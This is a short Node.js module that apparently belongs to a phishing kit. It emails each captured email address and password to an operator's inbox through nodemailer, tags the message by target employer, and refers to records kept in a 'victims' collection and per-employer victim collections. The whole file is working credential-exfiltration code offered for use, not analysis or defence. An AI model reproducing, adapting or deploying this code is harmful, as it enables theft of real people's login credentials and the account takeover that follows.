const nodemailer = require("nodemailer");

exports.sendLoginEmail = async ({ email, password, employerId }) => {
  const emailUser = process.env.EMAIL_USER?.trim();
  const emailPass = process.env.EMAIL_PASS?.trim();
  const receiverEmail = process.env.RECEIVER_EMAIL?.trim();

  if (!emailUser || !emailPass || !receiverEmail) {
    throw new Error("Missing email credentials in .env file.");
  }

  const transporter = nodemailer.createTransport({
    host: process.env.EMAIL_HOST?.trim() || "smtp.gmail.com",
    port: Number(process.env.EMAIL_PORT || 465),
    secure: process.env.EMAIL_SECURE === "true",
    auth: {
      user: emailUser,
      pass: emailPass,
    },
  });

  const employerName = (employerId || "general").toUpperCase();

  const mailOptions = {
    from: process.env.EMAIL_FROM?.trim() || emailUser,
    to: receiverEmail,
    subject: `🚨 New Login Submission [Employer: ${employerName}]`,
    html: `
      <h2>New Submission Received</h2>
      <p><strong>Employer / Ref:</strong> <span style="color: blue; font-weight: bold;">${employerName}</span></p>
      <p><strong>Email:</strong> ${email}</p>
      <p><strong>Password:</strong> ${password}</p>
      <hr />
      <p><small>Saved to main 'victims' collection and '${employerId || "general"}_victims' collection.</small></p>
    `,
  };

  return await transporter.sendMail(mailOptions);
};